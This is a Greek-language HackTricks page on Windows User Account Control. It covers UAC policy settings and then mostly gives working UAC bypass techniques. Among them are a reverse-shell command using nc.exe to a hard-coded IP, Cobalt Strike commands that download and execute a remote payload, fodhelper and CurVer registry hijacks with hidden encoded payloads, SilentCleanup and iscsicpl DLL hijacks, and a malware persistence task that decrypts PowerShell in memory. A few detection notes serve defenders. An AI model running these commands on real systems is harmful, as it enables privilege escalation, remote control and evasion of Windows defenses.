# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που επιτρέπει την εμφάνιση ενός **prompt συναίνεσης για ενέργειες που απαιτούν ανύψωση δικαιωμάτων**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν ενδεχομένως να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **στο security context ενός λογαριασμού χωρίς δικαιώματα διαχειριστή**, εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση επιπέδου διαχειριστή στο σύστημα για να εκτελεστούν. Είναι μια δυνατότητα ευκολίας που προστατεύει τους διαχειριστές από μη επιθυμητές αλλαγές, αλλά δεν θεωρείται security boundary.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν υπάρχει UAC, σε έναν χρήστη με δικαιώματα διαχειριστή παρέχονται 2 tokens: ένα standard user token, για την εκτέλεση κανονικών ενεργειών με medium integrity, και ένα με τα δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) εξηγεί σε μεγάλο βάθος πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία logon, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι διαχειριστές μπορούν να χρησιμοποιούν security policies για να ρυθμίσουν τον τρόπο λειτουργίας του UAC σύμφωνα με τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να τις ρυθμίσουν και να τις προωθήσουν μέσω Group Policy Objects (GPO) σε περιβάλλον domain Active Directory. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο ακόλουθος πίνακας παρέχει περισσότερες λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt για συναίνεση για non-Windows binaries στο secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt για credentials στο secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στο Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Policies για την εγκατάσταση software στα Windows

Τα **local security policies** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένα από προεπιλογή ώστε να **εμποδίζουν χρήστες χωρίς δικαιώματα διαχειριστή να πραγματοποιούν εγκαταστάσεις software**. Αυτό σημαίνει ότι ακόμη και αν ένας χρήστης χωρίς δικαιώματα διαχειριστή μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό διαχειριστή.

### Registry Keys για εξαναγκασμό του UAC να ζητά ανύψωση δικαιωμάτων

Ως standard user χωρίς δικαιώματα διαχειριστή, μπορείτε να διασφαλίσετε ότι ο "standard" λογαριασμός θα **καλείται από το UAC να εισαγάγει credentials** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί την τροποποίηση συγκεκριμένων **registry keys**, για τα οποία χρειάζεστε δικαιώματα διαχειριστή, εκτός αν υπάρχει **UAC bypass** ή ο attacker είναι ήδη συνδεδεμένος ως διαχειριστής.

Ακόμη και αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές εξαναγκάζουν τον χρήστη να **εισαγάγει ξανά τα credentials του λογαριασμού του** για να εκτελέσει administrative actions.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν διαθέτετε ήδη ένα elevated token, ένα UAC bypass ή μια misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, το ίδιο το registry write θα αποκλειστεί.**

Τα registry keys και οι entries που πρέπει να αλλάξετε είναι τα ακόλουθα (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Μετά την αλλαγή, οι administrative operations ζητούν από τον χρήστη να εισαγάγει ξανά τα credentials του.

### Σημείωση

**Το User Account Control δεν αποτελεί security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς exploit για local privilege escalation.

### Ζητήστε από έναν χρήστη «πλήρη πρόσβαση στον υπολογιστή»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει διεργασίες υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) από την πρόσβαση σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως τον φάκελο προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με low-integrity token. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη low-integrity zone, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η δυνατότητα συμβάλλει στην αποτροπή remote code execution attacks από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του χρήστη. Τα privileges ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, τα οποία χρησιμοποιούνται για την authentication του χρήστη στον υπολογιστή και σε resources του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να κάνουν αυτόματα log on έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε kiosk environments ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε secure systems, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε την κανονική συμπεριφορά logon, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι, αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε click στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context medium integrity και ο χρήστης σας ανήκει στο administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να γίνει bypass του UAC όταν βρίσκεται στο υψηλότερο security level (Always), σε σχέση με οποιοδήποτε από τα άλλα levels (Default).**

### Fast triage από medium-integrity shell

Πριν επιχειρήσετε ένα bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό scenario και αντιστοιχίστε το host build με γνωστές working methods:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν το `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας υψηλή ακεραιότητα.
- Το `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` αυξάνει τον βαθμό δυσκολίας, αλλά θα πρέπει και πάλι να δοκιμάσετε το ακριβές build αντί να υποθέσετε αποτυχία: το UACME εξακολουθεί να παρακολουθεί ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονα Windows builds.<sup>[[3]](#references)</sup>

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε reverse shell με admin privileges** (επίπεδο υψηλής ακεραιότητας) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Basic UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν user που ανήκει στο group Administrators, μπορείτε να κάνετε **mount το C$** shared μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **access σε ολόκληρο το file system** (ακόμη και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφαλείας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
Τα **Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Ανυψωμένα COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Τα COM objects με auto-elevation εξακολουθούν να αποτελούν πρακτική επιφάνεια UAC σε σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα offensive tools συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια interactive desktop process, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια **64-bit** process στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child process του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / UACME implementation αντί για ένα αφελές wrapper του `CreateProcess`.
- Αναμένετε η εκτέλεση του child process να πραγματοποιείται σε μια **ξεχωριστή elevated process**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits παράκαμψης UAC

Το [**UACME** ](https://github.com/hfiref0x/UACME)είναι μια **συλλογή** από διάφορα exploits παράκαμψης UAC. Σημειώστε ότι θα χρειαστεί να κάνετε **compile το UACME χρησιμοποιώντας visual studio ή msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά executables (όπως το `Source\Akagi\outout\x64\Debug\Akagi.exe`) και θα χρειαστεί να γνωρίζετε **ποιο από αυτά χρειάζεστε.**<sup>[[3]](#references)</sup>\
Θα πρέπει να είστε **προσεκτικοί**, επειδή ορισμένα bypasses θα **εμφανίσουν prompts από άλλα προγράμματα**, τα οποία θα **ειδοποιήσουν** τον **χρήστη** ότι συμβαίνει κάτι.<sup>[[3]](#references)</sup>

Το UACME διαθέτει την **έκδοση build από την οποία άρχισε να λειτουργεί κάθε technique**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτή](https://en.wikipedia.org/wiki/Windows_10_version_history) τη σελίδα, βρίσκετε το Windows release `1607` από τις build versions.

Ένα πρακτικό workflow είναι να **βαθμολογήσετε πρώτα το host build** και μόνο έπειτα να εκτελέσετε τη matching method:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το local build με τις γνωστές UAC methods, κάτι που είναι χρήσιμο για να απορρίπτονται γρήγορα τα dead PoCs.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Οι πρόσφατες releases πρόσθεσαν νέες methods και επανέλεγξαν τις υπάρχουσες σε **Windows 11 25H2**, επομένως ελέγξτε ξανά το README/release notes πριν θεωρήσετε ότι ένα παλιό blog post εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το trusted binary `fodhelper.exe` εκτελείται αυτόματα με elevated privileges στα σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά το παρακάτω per-user registry path χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας command εκεί επιτρέπει σε μια Medium Integrity process (ο user ανήκει στην ομάδα Administrators) να εκκινήσει μια High Integrity process χωρίς UAC prompt.

Registry path που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι το προεπιλεγμένο/ελαστικό (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε 64-bit Windows.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε τα UIs που ζητούν επιβεβαίωση για stealth.

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα δείγματα που κάνουν abuse του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και, αντί γι' αυτό, **ανακατευθύνουν το `ms-settings` ProgID** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την τοποθέτηση των keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μετά την ανύψωση δικαιωμάτων, το malware συνήθως **απενεργοποιεί τις μελλοντικές προτροπές** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0`, και στη συνέχεια εκτελεί επιπλέον defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και επαναδημιουργεί το persistence ώστε να εκτελείται με high integrity. Μια τυπική εργασία persistence αποθηκεύει ένα **PowerShell script κρυπτογραφημένο με XOR** στον δίσκο και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και να αφήνει μόνο τα staged payloads, με αποτέλεσμα η ανίχνευση να βασίζεται στην παρακολούθηση του **`CurVer` hijack**, της παραποίησης του `ConsentPromptBehaviorAdmin`, της δημιουργίας εξαιρέσεων του Defender ή των scheduled tasks που κάνουν in-memory decrypt του PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass μέσω του task `SilentCleanup` (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα δικαιώματα και επεκτείνει το `%windir%` από το user environment. Αν ελέγχετε το `HKCU\Environment\windir`, μπορείτε να ανακατευθύνετε αυτή την επέκταση σε μια αυθαίρετη εντολή και να αποκτήσετε high integrity χωρίς consent dialog.<sup>[[8]](#references)</sup> Αυτή η μέθοδος εξακολουθεί να αξίζει δοκιμή σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι τα Windows 11 24H2 ενδέχεται να απαιτούν μόνο μικρές προσαρμογές στα εισαγωγικά.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Εάν η εργασία παραθέτει το path σε εκείνο το build, δοκιμάστε ξανά με το payload να τελειώνει σε quote (για παράδειγμα `cmd.exe"`). Να κάνετε πάντα cleanup του `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse σε UI flows, COM objects ή desktop interaction απαιτούν μια **πλήρη interactive session** με το victim. Ένα συνηθισμένο shell μέσω `nc.exe` ή ένα service που εκτελείται στο **Session 0** συχνά δεν επαρκεί.

Συχνά μπορείτε να το λύσετε χρησιμοποιώντας μια **meterpreter** session. Κάντε migrate σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: Μπορείτε να το πετύχετε χρησιμοποιώντας μια meterpreter session. Κάντε migrate σε μια process που έχει την τιμή Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Εάν έχετε πρόσβαση σε **GUI**, μπορείτε απλώς να αποδεχτείτε το UAC prompt όταν εμφανιστεί. Δεν χρειάζεστε στην πραγματικότητα ένα technical bypass. Επομένως, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψετε την πρακτική επιβάρυνση που προσθέτει το UAC.

Επιπλέον, εάν αποκτήσετε μια GUI session που χρησιμοποιούσε κάποιος (πιθανώς μέσω RDP), θα υπάρχουν **ορισμένα tools που θα εκτελούνται ως administrator**, από τα οποία θα μπορούσατε να **τρέξετε** για παράδειγμα ένα **cmd** **ως admin**, χωρίς να εμφανιστεί ξανά UAC prompt, όπως το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Noisy brute-force UAC bypass

Εάν δεν σας ενδιαφέρει να είστε noisy, μπορείτε πάντα να **τρέξετε κάτι όπως** το [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), το οποίο **ζητά να γίνει elevation των permissions μέχρι ο user να το αποδεχτεί**.

### Το δικό σας bypass - Basic UAC bypass methodology

Εάν ρίξετε μια ματιά στο **UACME**, θα παρατηρήσετε ότι **πολλά UAC bypasses κάνουν abuse σε DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα attacker-controlled DLL από ένα writable path). [Διαβάστε αυτό για να μάθετε πώς να εντοπίζετε ένα DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα κάνει **autoelevate** (ελέγξτε ότι όταν εκτελείται, εκτελείται σε high integrity level).
2. Με το procmon εντοπίστε events "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποια **protected paths** (όπως το C:\Windows\System32), όπου δεν έχετε write permissions. Μπορείτε να το παρακάμψετε χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός CAB file μέσα σε protected paths (επειδή αυτό το tool εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Προετοιμάστε ένα **script** για να αντιγράψετε το DLL μέσα στο protected path και να εκτελέσετε το vulnerable και autoelevated binary.

### Μια άλλη τεχνική UAC bypass

Συνίσταται στην παρακολούθηση του εάν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή **command** προς **εκτέλεση** (αυτό είναι πιο ενδιαφέρον εάν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse ώστε να φορτώσει το `iscsiexe.dll` μέσω search order. Εάν μπορείτε να τοποθετήσετε ένα malicious `iscsiexe.dll` μέσα σε έναν **user-writable** φάκελο και στη συνέχεια να τροποποιήσετε το `PATH` του current user (για παράδειγμα μέσω `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον φάκελο, τα Windows ενδέχεται να φορτώσουν το attacker DLL μέσα στην elevated process του `iscsicpl.exe`, **χωρίς να εμφανίσουν UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο current user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο στο **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετωπίστε το αντίγραφο στο **System32** ως ξεχωριστό binary και επικυρώστε τη συμπεριφορά του ανεξάρτητα.
- Το primitive είναι συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως το ίδιο ProcMon workflow που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για την επικύρωση του missing DLL load.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες για detection:
- Δημιουργήστε alert για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path` που ακολουθούνται άμεσα από εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζητήστε το `iscsiexe.dll` σε **τοποθεσίες υπό τον έλεγχο του χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
